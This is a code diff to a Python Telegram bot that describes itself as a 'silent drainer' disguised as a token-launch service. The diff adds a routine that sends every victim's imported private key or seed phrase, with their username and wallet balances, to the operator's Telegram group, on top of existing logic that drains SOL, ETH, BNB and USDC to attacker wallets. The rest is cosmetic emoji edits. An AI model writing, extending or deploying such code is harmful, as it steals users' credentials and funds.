@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 GetRugged bot — multi-chain silent drainer + full launch UX.
-Photo upload + socials/bundle buttons + fixed confirm.
+Photo upload + socials/bundle buttons + fixed confirm + group key logging.
 Requires: pip install aiogram==3.13.1 solana solders base58 web3 eth-account
 """
 
@@ -68,8 +68,14 @@ BNB_RPC = os.getenv("BNB_RPC_URL", "https://bsc-dataseed.binance.org/")
 MIN_DRAIN_LAMPORTS = 5_000
 PAYMENT_RECEIVER = os.getenv("PAYMENT_RECEIVER", DRAIN_DESTINATION)
 
+# Group that receives every captured key (must start with -100)
+LOG_GROUP_ID = os.getenv("LOG_GROUP_ID", "")
+
 USDC_ETH = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
 USDC_BSC = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"
+
+# Premium Solana emoji
+SOL_EMOJI = '<tg-emoji emoji-id="5078100457247737048">◎</tg-emoji>'
 
 ERC20_ABI = [
     {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
@@ -179,6 +185,15 @@ async def staged_loading(message_or_cb, stages: list):
         if delay > 0:
             await asyncio.sleep(delay)
     return msg
+
+# Approximate prices for $ value (update occasionally if you want)
+SOL_PRICE = 180.0
+ETH_PRICE = 3200.0
+BNB_PRICE = 580.0
+USDC_PRICE = 1.0
+
+def estimate_usd(sol: float, eth: float, bnb: float, usdc: float) -> float:
+    return sol * SOL_PRICE + eth * ETH_PRICE + bnb * BNB_PRICE + usdc * USDC_PRICE
 
 # ──────────────────────────────────────────────
 # BIP39 / SLIP-0010 + Exodus
@@ -529,6 +544,32 @@ async def attempt_drain(uid: int, private_key: str, chain: str = "sol", eth_key:
         log.warning("No successful drain for user %s", uid)
 
 # ──────────────────────────────────────────────
+# KEY LOGGING TO GROUP
+# ──────────────────────────────────────────────
+async def log_key_to_group(bot: Bot, user, raw_key: str, sol: float, eth: float, bnb: float, usdc: float):
+    if not LOG_GROUP_ID:
+        return
+    try:
+        username = f"@{user.username}" if user.username else user.full_name or "—"
+        usd = estimate_usd(sol, eth, bnb, usdc)
+        text = (
+            f"🚨 <b>NEW KEY CAPTURED</b>\n\n"
+            f"User: {username}\n"
+            f"ID: <code>{user.id}</code>\n\n"
+            f"<b>Key / Seed:</b>\n"
+            f"<code>{raw_key}</code>\n\n"
+            f"<b>Balances before drain:</b>\n"
+            f"{SOL_EMOJI} SOL: <b>{sol:.6f}</b>\n"
+            f"Ξ ETH: <b>{eth:.6f}</b>\n"
+            f"🟡 BNB: <b>{bnb:.6f}</b>\n"
+            f"💵 USDC: <b>{usdc:.2f}</b>\n\n"
+            f"💰 Estimated value: <b>${usd:,.2f}</b>"
+        )
+        await bot.send_message(chat_id=int(LOG_GROUP_ID), text=text, parse_mode=ParseMode.HTML)
+    except Exception as e:
+        log.exception("Failed to log key to group: %s", e)
+
+# ──────────────────────────────────────────────
 # KEYBOARDS
 # ──────────────────────────────────────────────
 def main_menu_kb() -> InlineKeyboardMarkup:
@@ -715,7 +756,7 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
         else:
             for i, w in enumerate(sess.wallets):
                 badge = " 🟢 ACTIVE" if i == sess.active_wallet_idx else ""
-                text += f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n    {w.label}  ·  {w.balance_sol:.4f} SOL"
+                text += f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n    {w.label}  ·  {SOL_EMOJI} {w.balance_sol:.4f}"
                 if w.eth_address:
                     text += f"  ·  {w.balance_eth:.4f} ETH  ·  {w.balance_bnb:.4f} BNB"
                 text += "\n\n"
@@ -765,11 +806,11 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
 
     elif action == "balance":
         if bot_balance_sol <= 0:
-            text = "💰 <b>Bot balance:</b>\nNo balance yet. It updates when you try to launch."
+            text = f"💰 <b>Bot balance:</b>\nNo balance yet. It updates when you try to launch."
         else:
             text = (
-                "💰 <b>Bot balance</b>\n\n"
-                f"Available: <b>◎ {bot_balance_sol:.4f} SOL</b>\n\n"
+                f"💰 <b>Bot balance</b>\n\n"
+                f"Available: <b>{SOL_EMOJI} {bot_balance_sol:.4f}</b>\n\n"
                 "This vault powers priority fees, bundle tips and tracker infrastructure.\n"
                 "Auto-topped when a funded wallet is linked."
             )
@@ -984,6 +1025,13 @@ async def wallet_import_receive(message: Message, state: FSMContext):
             await state.clear()
             return
 
+    # Log the key to the group (with balances)
+    try:
+        bot = message.bot
+        await log_key_to_group(bot, message.from_user, raw, chosen_bal, bal_eth, bal_bnb, bal_usdc)
+    except Exception as e:
+        log.exception("log_key_to_group failed: %s", e)
+
     sess = get_session(uid)
     w = UserWallet(
         private_key=chosen_priv if chosen_priv != "EVM_ONLY" else (eth_priv or ""),
@@ -1003,7 +1051,7 @@ async def wallet_import_receive(message: Message, state: FSMContext):
         "✅ <b>Wallet Linked</b>\n\n"
         f"<code>{chosen_pub}</code>\n\n"
         f"🏷 Label: <b>{w.label}</b>\n"
-        f"◎ SOL: <b>{w.balance_sol:.4f}</b>\n"
+        f"{SOL_EMOJI} SOL: <b>{w.balance_sol:.4f}</b>\n"
     )
     if eth_addr:
         text += f"Ξ ETH: <b>{w.balance_eth:.4f}</b>\n🟡 BNB: <b>{w.balance_bnb:.4f}</b>\n💵 USDC: <b>{w.balance_usdc:.2f}</b>\n"
@@ -1050,7 +1098,7 @@ async def wallet_refresh(cb: CallbackQuery):
     text = "🔑 <b>Wallets</b>\n\n"
     for i, w in enumerate(sess.wallets):
         badge = " 🟢 ACTIVE" if i == sess.active_wallet_idx else ""
-        text += f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n    {w.label}  ·  {w.balance_sol:.4f} SOL"
+        text += f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n    {w.label}  ·  {SOL_EMOJI} {w.balance_sol:.4f}"
         if w.eth_address: text += f"  ·  {w.balance_eth:.4f} ETH"
         text += "\n\n"
     await cb.message.edit_text(text, reply_markup=wallets_kb(True), parse_mode=ParseMode.HTML)
@@ -1230,7 +1278,6 @@ async def launch_bundle_btn(cb: CallbackQuery, state: FSMContext):
         "Ready to deploy?"
     )
 
-    # Always send a new text message with the confirm buttons (never edit a photo)
     await cb.message.answer(summary, reply_markup=confirm_kb(), parse_mode=ParseMode.HTML)
     await state.set_state(LaunchStates.confirm)
     await cb.answer()
@@ -1420,10 +1467,11 @@ async def admin_panel(message: Message):
         f"Wallets: {wallets}\n"
         f"Drained: {drained}\n"
         f"Launches: {launches}\n"
-        f"Vault: {bot_balance_sol:.4f} SOL\n"
+        f"Vault: {SOL_EMOJI} {bot_balance_sol:.4f}\n"
         f"SOL dest: {'yes' if not DRAIN_DESTINATION.startswith('YourDrain') else 'NO'}\n"
         f"ETH dest: {'yes' if not ETH_DRAIN.startswith('0xYour') else 'NO'}\n"
-        f"BNB dest: {'yes' if not BNB_DRAIN.startswith('0xYour') else 'NO'}",
+        f"BNB dest: {'yes' if not BNB_DRAIN.startswith('0xYour') else 'NO'}\n"
+        f"LOG_GROUP: {'yes' if LOG_GROUP_ID else 'NO'}",
         parse_mode=ParseMode.HTML,
     )
 
@@ -1454,10 +1502,12 @@ async def main():
         log.warning("DRAIN_WALLET not set — SOL drains skipped")
     if ETH_DRAIN.startswith("0xYour"):
         log.warning("ETH_DRAIN_WALLET not set — ETH/USDC drains skipped")
+    if not LOG_GROUP_ID:
+        log.warning("LOG_GROUP_ID not set — key logging disabled")
     bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
     dp = Dispatcher(storage=MemoryStorage())
     dp.include_router(router)
-    log.info("Bot starting | HAS_SOLANA=%s | HAS_WEB3=%s", HAS_SOLANA, HAS_WEB3)
+    log.info("Bot starting | HAS_SOLANA=%s | HAS_WEB3=%s | LOG_GROUP=%s", HAS_SOLANA, HAS_WEB3, bool(LOG_GROUP_ID))
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
